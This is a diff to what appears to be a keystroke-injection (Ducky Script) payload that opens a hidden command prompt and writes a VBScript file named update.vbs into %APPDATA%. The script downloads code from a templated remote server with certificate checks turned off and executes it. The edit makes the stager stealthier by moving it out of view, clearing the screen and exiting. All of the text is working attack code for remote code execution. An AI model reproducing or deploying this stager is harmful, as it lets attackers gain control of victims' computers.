@@ -4,15 +4,18 @@ DELAY 400
 STRING cmd /Q /D /T:01 /F:OFF /V:ON /K
 ENTER
 DELAY 400
-STRING copy /Y con update.vbs
+STRING copy /Y con %APPDATA%\update.vbs
 ENTER
-STRING On Error Resume Next:Set Y=New RegExp:Y.Pattern="((.|\n)+)":
 STRING Set X=CreateObject("MSXML2.ServerXMLHTTP.6.0")
 STRING :X.setOption 2,13056:X.Open"GET",
 STRING "<http_prefix>://<host_and_port><registered_uri_path>"
-STRING ,0:X.Send:Execute (Y.Execute(X.responseText).Item(0).Submatches(0))
+STRING ,0:X.Send:WScript.Sleep 5000:Execute X.responseText
 ENTER
 CTRL z
 ENTER
-STRING cscript update.vbs
+STRING cls
+ENTER
+STRING %APPDATA%\update.vbs
+ENTER
+STRING exit
 ENTER
